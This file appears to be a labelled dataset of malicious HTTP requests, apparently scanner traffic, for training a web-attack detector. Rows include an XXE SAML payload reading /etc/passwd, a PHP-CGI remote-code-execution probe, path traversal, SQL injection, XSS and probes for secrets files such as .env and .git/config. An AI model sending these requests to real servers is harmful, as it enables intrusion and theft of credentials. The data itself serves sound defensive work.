method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/relay,SAMLRequest=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI%2FPjwhRE9DVFlQRSBkb2MgWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiBdID4KPHNhbWxwOkF1dGhuUmVxdWVzdCB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iZGZmNTc4YzMwNDlmNWJhMTAyMjNkZjgyMDEyM2ZjY2NiYzEzNGU3NTIwIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAxNC0wNS0wOFQxMTo1ODozM1oiIERlc3RpbmF0aW9uPSJqYXZhc2NyaXB0OnByb21wdChkb2N1bWVudC5kb21haW4sZG9jdW1lbnQuY29va2llKSI%2BIDxzYW1sOklzc3Vlcj4meHhlOzwvc2FtbDpJc3N1ZXI%2BIDxzYW1scDpFeHRlbnNpb25zPiA8VUk%2BPFVSTD4meHhlOzwvVVJMPjwvVUk%2BIDwvc2FtbHA6RXh0ZW5zaW9ucz4gPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BIDxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BIDxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjcnNhLXNoYTEiLz4gPGRzOlJlZmVyZW5jZSBVUkk9IiNkZmY1NzhjMzA0OWY1YmExMDIyM2RmODIwMTIzZmNjY2JjMTM0ZTc1MjAiPjxkczpUcmFuc2Zvcm1zPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjZW52ZWxvcGVkLXNpZ25hdHVyZSIvPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8%2BPGRzOkRpZ2VzdFZhbHVlPjVCV2l5WDl6dkFDR1I1eStOQjJ3eHVYSnRKRT08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BUzRMaENVT0IweWxUNGNqWFVWQWJudnJCakJCenliYXh2V0hUR3c5Sm5Sc3lVQjFNZXRSSytWSHZWL00zUTROWDBER1VORlhsQ1pSM3NNMm1zUU9BaGJqWnhrS1FDTlVCaWc1Ni8wM3Bnc1hscFdKRmhuQkw4bTBzUlJaQmR1ZjRRZEhuL2h4eHl2QUt6YWRQUTVubUlQbUNQcE8xQ1FzUlVUTXJ0LzEzVklFPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BIDwvZHM6U2lnbmF0dXJlPjwvc2FtbHA6QXV0aG5SZXF1ZXN0Pg%3D%3D&response_url=http%3A%2F%2Fhax&RelayState=aHR0cHM6Ly9uczM2NTMyOS5vdmgubmV0Ojg0NDMv&RefererScheme=https&RefererHost=https%3A%2F%2FX.com%3A8443&RefererPort=8443,0,0,0,0,0,0,bad
GET,/demo_db.sql,,0,0,0,0,0,0,bad
GET,/@bxss.me::80/rpb.png,,0,0,0,0,0,0,bad
GET,/register.aspx,,0,0,0,0,0,0,bad
GET,/AdminProps,,0,0,0,0,0,0,bad
POST,/cgi-bin/php5.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E,<?php echo(md5('testing-php-cgi-rce')); ?>,2,2,0,2,18,0,bad
GET,/helpdesk/setup/index.php,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/graphs/,,0,0,0,0,0,0,bad
TRACK,/K7WY2jyOjT,,0,0,0,0,0,0,bad
TESTING,/9517399,,0,0,0,0,0,0,bad
GET,/login.jsp?search=<script>alert(1)</script>,,0,0,0,1,0,0,bad
GET,/login.jsp?param=cmd.exe,,0,0,0,0,0,0,bad
GET,/phpMyAdmin/main.php,,0,0,0,0,0,0,bad
GET,/examples/jsp/index.html,,0,0,0,0,0,0,bad
GET,/sdk/../../../../../../../../../../../../../etc/passwd,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.cfm,,0,0,0,0,0,0,bad
GET,/AdminRealm,,0,0,0,0,0,0,bad
GET,/nulEHyIb,,0,0,0,0,0,0,bad
GET,/login.jsp?param=-1+UNION+SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables,,0,0,0,1,5,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/_nuster,,0,0,0,0,0,0,bad
GET,/WEB-INF/web.xml,,0,0,0,0,0,0,bad
GET,/cgi-sys/domainredirect.cgi,,0,0,0,0,0,0,bad
GET,/demo-db.sql,,0,0,0,0,0,0,bad
GET,/pma/main.php,,0,0,0,0,0,0,bad
GET,/login.jsp?page=1,,0,0,0,0,0,0,bad
GET,/database.yml.sqlite3,,0,0,0,0,0,0,bad
TRACE,/K7WY2jyOjT,,0,0,0,0,0,0,bad
GET,/jsp/viewer/snoop.jsp,,0,0,0,0,0,0,bad
GET,/KExy9Nia,,0,0,0,0,0,0,bad
GET,/login.jsp?page=../../../../../../../../../etc/passwd%00.jpg,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/support/setup/index.php,,0,0,0,0,0,0,bad
GET,/nuster,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.jsp,,0,0,0,0,0,0,bad
GET,/demo_database.sql,,0,0,0,0,0,0,bad
GET,/login.jsp?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E,,0,0,0,1,0,0,bad
GET,/config/database.yml,,0,0,0,0,0,0,bad
GET,/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini,,0,0,0,0,0,0,bad
GET,/cgi-mod/index.cgi,,0,0,0,0,0,0,bad
GET,/AdminThreads,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/mysql/main.php,,0,0,0,0,0,0,bad
GET,/WEB-INF/web.xml~,,0,0,0,0,0,0,bad
GET,/:@bxss.me::80/rpb.png,,0,0,0,0,0,0,bad
GET,/u7uJJqG3wjmg10FR,,0,0,0,0,0,0,bad
GET,/config/database.yml_original,,0,0,0,0,0,0,bad
GET,/index.php,,0,0,0,0,0,0,bad
GET,/stat/,,0,0,0,0,0,0,bad
GET,/X0VrA7cz2a.cfm,,0,0,0,0,0,0,bad
GET,/register.jsp,,0,0,0,0,0,0,bad
GET,/db/main.php,,0,0,0,0,0,0,bad
GET,/examples/servlets/servlet/SessionExample,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.jspa,,0,0,0,0,0,0,bad
GET,/application/configs/application.ini,,0,0,0,0,0,0,bad
GET,/secrets.json,,0,0,0,0,0,0,bad
GET,/now.json,,0,0,0,0,0,0,bad
GET,/AdminVersion,,0,0,0,0,0,0,bad
GET,/demo-database.sql,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/9026798,,0,0,0,0,0,0,bad
GET,/config/database.yml~,,0,0,0,0,0,0,bad
GET,/config.json,,0,0,0,0,0,0,bad
GET,/registration.html,,0,0,0,0,0,0,bad
GET,/env.json,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/appsettings.json,,0,0,0,0,0,0,bad
GET,/dbadmin/main.php,,0,0,0,0,0,0,bad
GET,/v1/swagger.json,,0,0,0,0,0,0,bad
GET,/v2/swagger.yaml,,0,0,0,0,0,0,bad
GET,/swagger/v1/swagger.json,,0,0,0,0,0,0,bad
GET,/swagger/v2/swagger.json,,0,0,0,0,0,0,bad
GET,/api/swagger.json,,0,0,0,0,0,0,bad
GET,/api/v1.0/swagger.yaml,,0,0,0,0,0,0,bad
GET,/api/v2.0/swagger.json,,0,0,0,0,0,0,bad
GET,/api/v2.0/swagger.yaml,,0,0,0,0,0,0,bad
GET,/static/api/swagger.yaml,,0,0,0,0,0,0,bad
GET,/api-docs/swagger.yaml,,0,0,0,0,0,0,bad
GET,/api/swaggerui/swagger.json,,0,0,0,0,0,0,bad
GET,/swagger-ui/swagger.yaml,,0,0,0,0,0,0,bad
GET,/api/v1/openapi.json,,0,0,0,0,0,0,bad
GET,/sensorlist.htm,,0,0,0,0,0,0,bad
GET,/WEB-INF/web.xml_,,0,0,0,0,0,0,bad
GET,/demo_dump.sql,,0,0,0,0,0,0,bad
GET,/default.json,,0,0,0,0,0,0,bad
GET,/config/database.yml.pgsql,,0,0,0,0,0,0,bad
GET,/?id=JJJ0QQQ&action=JJJ1QQQ&page=JJJ2QQQ&name=JJJ3QQQ&f=JJJ4QQQ&url=JJJ5QQQ&email=JJJ6QQQ&type=JJJ7QQQ&file=JJJ8QQQ&title=JJJ9QQQ&code=JJJ10QQQ&q=JJJ11QQQ&user=JJJ12QQQ&token=JJJ13QQQ&t=JJJ14QQQ&c=JJJ15QQQ&data=JJJ16QQQ&mode=JJJ17QQQ&order=JJJ18QQQ&lang=JJJ19QQQ&p=JJJ20QQQ&key=JJJ21QQQ&status=JJJ22QQQ&start=JJJ23QQQ&charset=JJJ24QQQ&s=JJJ25QQQ&post=JJJ26QQQ&login=JJJ27QQQ&search=JJJ28QQQ&content=JJJ29QQQ&comment=JJJ30QQQ&step=JJJ31QQQ&ajax=JJJ32QQQ&debug=JJJ33QQQ&state=JJJ34QQQ&query=JJJ35QQQ&error=JJJ36QQQ&save=JJJ37QQQ&sort=JJJ38QQQ&format=JJJ39QQQ&tab=JJJ40QQQ&offset=JJJ41QQQ&edit=JJJ42QQQ&preview=JJJ43QQQ&filter=JJJ44QQQ&from=JJJ45QQQ&view=JJJ46QQQ&a=JJJ47QQQ&limit=JJJ48QQQ&do=JJJ49QQQ&plugin=JJJ50QQQ&theme=JJJ51QQQ&text=JJJ52QQQ&test=JJJ53QQQ&path=JJJ54QQQ&pass=JJJ55QQQ&dir=JJJ56QQQ&show=JJJ57QQQ&h=JJJ58QQQ&value=JJJ59QQQ&filename=JJJ60QQQ&redirect=JJJ61QQQ&year=JJJ62QQQ&group=JJJ63QQQ&template=JJJ64QQQ&subject=JJJ65QQQ&m=JJJ66QQQ&u=JJJ67QQQ&dest=JJJ68QQQ&uri=JJJ69QQQ&continue=JJJ70QQQ&window=JJJ71QQQ&next=JJJ72QQQ&reference=JJJ73QQQ&site=JJJ74QQQ&&40TgT=JJJ75QQQ&,,0,0,0,0,0,0,bad
GET,/v2/swagger.json,,0,0,0,0,0,0,bad
GET,/browseDirectory.jsp,,0,0,0,0,0,0,bad
GET,/swagger.json,,0,0,0,0,0,0,bad
GET,/api/swagger.yaml,,0,0,0,0,0,0,bad
GET,/api/v1/swagger.json,,0,0,0,0,0,0,bad
GET,/api/v2/swagger.json,,0,0,0,0,0,0,bad
GET,/api/apidocs/swagger.yaml,,0,0,0,0,0,0,bad
GET,/api/spec/swagger.yaml,,0,0,0,0,0,0,bad
POST,/cgi-bin/php5-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E,<?php echo(md5('testing-php-cgi-rce')); ?>,2,2,0,2,18,0,bad
GET,/setup/install.php,,0,0,0,0,0,0,bad
GET,/stats/,,0,0,0,0,0,0,bad
GET,/BizTalkServer,,0,0,0,0,0,0,bad
GET,/sidekiq,,0,0,0,0,0,0,bad
GET,/v1/swagger.yaml,,0,0,0,0,0,0,bad
GET,/WEB-INF/web.xml.bak,,0,0,0,0,0,0,bad
GET,/swagger/v1/swagger.yaml,,0,0,0,0,0,0,bad
GET,/mysqladmin/main.php,,0,0,0,0,0,0,bad
GET,/static/api/swagger.json,,0,0,0,0,0,0,bad
GET,/apidocs/swagger.json,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/apidocs/swagger.yaml,,0,0,0,0,0,0,bad
GET,/api/spec/swagger.json,,0,0,0,0,0,0,bad
GET,/settings.json,,0,0,0,0,0,0,bad
GET,/nodemon.json,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/opencart/install/index.php?route=install/step_2,,0,0,0,0,0,0,bad
GET,/registration.cgi,,0,0,0,0,0,0,bad
GET,/8aBrll7b,,0,0,0,0,0,0,bad
GET,/api/v1.0/swagger.json,,0,0,0,0,0,0,bad
GET,/?content=PPP0QQQ&,,0,0,0,0,0,0,bad
GET,/search,,0,0,0,0,0,0,bad
GET,/api-docs/swagger.json,,0,0,0,0,0,0,bad
GET,/api/swaggerui/swagger.yaml,,0,0,0,0,0,0,bad
GET,/PMA/main.php,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.stm,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/awstats/,,0,0,0,0,0,0,bad
GET,/demo-dump.sql,,0,0,0,0,0,0,bad
GET,/swagger.yaml,,0,0,0,0,0,0,bad
GET,/WEB-INF/web.xml%20(copy),,0,0,0,1,1,0,bad
GET,/swagger-ui/swagger.json,,0,0,0,0,0,0,bad
GET,/cgi-bin/test.cgi,,0,0,0,0,0,0,bad
GET,/config-prod.json,,0,0,0,0,0,0,bad
GET,/app.json,,0,0,0,0,0,0,bad
GET,/config/database.yml.sqlite3,,0,0,0,0,0,0,bad
GET,/api/v1/swagger.yaml,,0,0,0,0,0,0,bad
GET,/api/apidocs/swagger.json,,0,0,0,0,0,0,bad
GET,/.php_cs.cache,,0,0,0,0,0,0,bad
GET,/registration.php,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/demo_backup.sql,,0,0,0,0,0,0,bad
GET,/npm-debug.log,,0,0,0,0,0,0,bad
GET,/../../../../../../../../z/../../../../../../../../../etc/shells,,0,0,0,0,0,0,bad
GET,/swagger/v2/swagger.yaml,,0,0,0,0,0,0,bad
GET,/Bootstrap,,0,0,0,0,0,0,bad
GET,/manage.py,,0,0,0,0,0,0,bad
GET,/_awstats/,,0,0,0,0,0,0,bad
GET,/app/config/database.yml,,0,0,0,0,0,0,bad
POST,/,class.module.classLoader.URLs%5B0%5D=0,0,0,0,0,0,0,bad
GET,/em/afr/ufmth/remote/H4sIAAAAAAAACnWMsU7DMBCGr6RRU9QBGBg6VmK1y0AiwQASUtVI6QJix8RubWRiY1_BLDwGT8FLIJ6AlZmVN0ACp8rKL93pO%2Bn%2B7_UbUu9g95Y9MLJGpcmceblgNh18vr3vX38ksDWDbW0Yn7EajSthiNIJL43mwZ6eQZvRYxb3TpxelI02skYgubqoXg6KfPzz5RIYlJDJKD83XJTQt8ZhBUO2RmmcwieEvaotUs2aFb1Ep5rVSQX9pdLiHp4hiSyNx44z6wya2ujuTpxYbjDY3y4IY6kwP8yPptMihhd5zclN8J7cCYQebf9TjFpEawPCpIVjSv9v0fAHzkx9_TEBAAA%3D/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/node_modules/body-parser/package.json,,0,0,0,0,0,0,bad
GET,/install/index.php?route=install/step_2,,0,0,0,0,0,0,bad
GET,/demo-backup.sql,,0,0,0,0,0,0,bad
PUT,/cgtzyIAQ.txt,WSTkxyY60LciD6cxFLRDTdVSTgsuYX,0,0,0,0,0,0,bad
GET,//..;/..;/..;/..;/..;/,,0,0,0,0,0,0,bad
GET,/registration.asp,,0,0,0,0,0,0,bad
GET,/api/v2/swagger.yaml,,0,0,0,0,0,0,bad
GET,/webstats/,,0,0,0,0,0,0,bad
GET,/myadmin/main.php,,0,0,0,0,0,0,bad
GET,/app/config/database.yml_original,,0,0,0,0,0,0,bad
GET,/hits/hit6165007777d76cd,,0,0,0,0,0,0,bad
GET,/management/info,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/backoffice/login.zul,,0,0,0,0,0,0,bad
GET,/install.php,,0,0,0,0,0,0,bad
GET,/scripts/manage.py,,0,0,0,0,0,0,bad
DEBUG,/testing_invalid_filename.aspx,,0,0,0,0,0,0,bad
GET,/apc.php,,0,0,0,0,0,0,bad
GET,/logs?dl=bGFyYXZlbC5sb2c=,,0,0,0,0,0,0,bad
GET,/package.json,,0,0,0,0,0,0,bad
GET,/WEB-INF/web.xml%20-%20Copy,,0,0,0,0,2,0,bad
GET,/webstat/,,0,0,0,0,0,0,bad
GET,/users.mdb,,0,0,0,0,0,0,bad
HEAD,/server,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/Certificate,,0,0,0,0,0,0,bad
GET,/registration.aspx,,0,0,0,0,0,0,bad
GET,/Dump.aspx,,0,0,0,0,0,0,bad
GET,//..;/,,0,0,0,0,0,0,bad
GET,/Trace.axd,,0,0,0,0,0,0,bad
GET,/.bzr/README,,0,0,0,0,0,0,bad
GET,/package-lock.json,,0,0,0,0,0,0,bad
GET,/WEB-INF/Copy%20of%20web.xml,,0,0,0,0,2,0,bad
GET,/backup-demo.sql,,0,0,0,0,0,0,bad
GET,/clients.mdb,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/DEADJOE,,0,0,0,0,0,0,bad
GET,/druid/weburi.html,,0,0,0,0,0,1,bad
GET,/Classpath,,0,0,0,0,0,0,bad
GET,/core,,0,0,0,0,0,0,bad
GET,/cgi-bin-sdb/printenv,,0,0,0,0,0,0,bad
GET,/.env,,0,0,0,0,0,0,bad
HEAD,/backend,,0,0,0,0,0,0,bad
GET,/CVS/Root,,0,0,0,0,0,0,bad
GET,/suitecrm/install.php,,0,0,0,0,0,0,bad
GET,/webcenter/afr/uptni/remote/H4sIAAAAAAAACnWMsU7DMBCGr6RRU9QBGBg6IrHaUKQ0hQEkpIpIYQGx4zZubWRiY1%2BpWXiMPkVfAvEErMysvAESOFVWfulO30n3f%2BtviJ2F3Qf2zMgCpSJXzIlrZuLO59v7_v1HBFtj2FaalWM2RW1z6KKw3AmtSm_OL6BOb5mEvROmFWS9jaziSO5uitXhMO3_fNkIOjkkIsgvdclzaBttsYAuW6DQVuILwl5RF6li1ZzeopXV_KyA9kwq_gSvEAUW2mHDibEa9VSr5o4sn23Qm98mCH0hcXicZoPRKMsGJzw9mpCJd448coQWrf9jDFpEYzzCQQ2nlP7fov4PdaIPPzEBAAA%3D/,,0,0,0,0,0,0,bad
GET,/app/config/database.yml~,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/app/controllers/application_controller.rb,,0,0,0,0,0,0,bad
GET,/dbconsole/login.jsp,,0,0,0,0,0,0,bad
GET,/WEB-INF%20(copy)/web.xml,,0,0,0,1,1,0,bad
GET,/application.wadl,,0,0,0,0,0,0,bad
GET,/setup.py,,0,0,0,0,0,0,bad
GET,/phpmyadmin2/main.php,,0,0,0,0,0,0,bad
GET,/private.mdb,,0,0,0,0,0,0,bad
GET,/browser/,,0,0,0,0,0,0,bad
GET,//_mmServerScripts/MMHTTPDB.php,,0,0,0,0,0,0,bad
GET,/statistics/,,0,0,0,0,0,0,bad
GET,/hits/hit71682998823e60b,,0,0,0,0,0,0,bad
GET,/app/config/database.yml.pgsql,,0,0,0,0,0,0,bad
GET,/.hg/requires,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/._env,,0,0,0,0,0,0,bad
HEAD,/app,,0,0,0,0,0,0,bad
GET,/ConsoleHelp,,0,0,0,0,0,0,bad
GET,/.git/config,,0,0,0,0,0,0,bad
GET,/suite/install.php,,0,0,0,0,0,0,bad
GET,/backup_demo.sql,,0,0,0,0,0,0,bad
GET,/h2console/login.jsp,,0,0,0,0,0,0,bad
GET,/_mmServerScripts/MMHTTPDB.asp,,0,0,0,0,0,0,bad
GET,/.htaccess,,0,0,0,0,0,0,bad
GET,/WEB-INF%20-%20Copy/web.xml,,0,0,0,0,2,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/config.py,,0,0,0,0,0,0,bad
GET,/.idea/workspace.xml,,0,0,0,0,0,0,bad
OPTIONS,/,,0,0,0,0,0,0,bad
GET,/admin-console,,0,0,0,0,0,0,bad
GET,/Statistik/,,0,0,0,0,0,0,bad
GET,/Gemfile,,0,0,0,0,0,0,bad
GET,/demo.testfire.net.sql,,0,0,0,0,0,0,bad
GET,/phpMyAdmin2/main.php,,0,0,0,0,0,0,bad
GET,/read.me,,0,0,0,0,0,0,bad
GET,//..;/..;/,,0,0,0,0,0,0,bad
GET,/DefaultWebApp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/.svn/entries,,0,0,0,0,0,0,bad
GET,/app/config/database.yml.sqlite3,,0,0,0,0,0,0,bad
GET,/bicomposer/afr/ifpdp/remote/H4sIAAAAAAAACnWMsU7DMBCGr6RRU9QBGBg6IrHaqSrSAgNISBWRwgJixzRObWRiY1%2BpWXgMnoKXQDwBKzMrb4AETpWVX7rTd9L93%2Bs3xM7C9h17ZGSJUpFz5sQFM3Hv8%2B199%2BYjgo0ZbCrNyhmbo7Y59FFY7oRWpTcnp9BksErC3grTCbLBWlZzJNeXxcv%2BJBv%2BfNkIejkkIsjPdMlz6BptsYA%2BW6LQVuITwk7RFKli9YJeoZX14riAbiUVf4BniAIL7bDlxFiNeq5Ve0eWV2v05rcNwlBInI7Sw%2BlBNh6l2TitJuTWO0fuOUKHNv8xBi2iMR5hr4EjSv9vUf8Hd2OJqzEBAAA%3D/,,0,0,0,0,0,0,bad
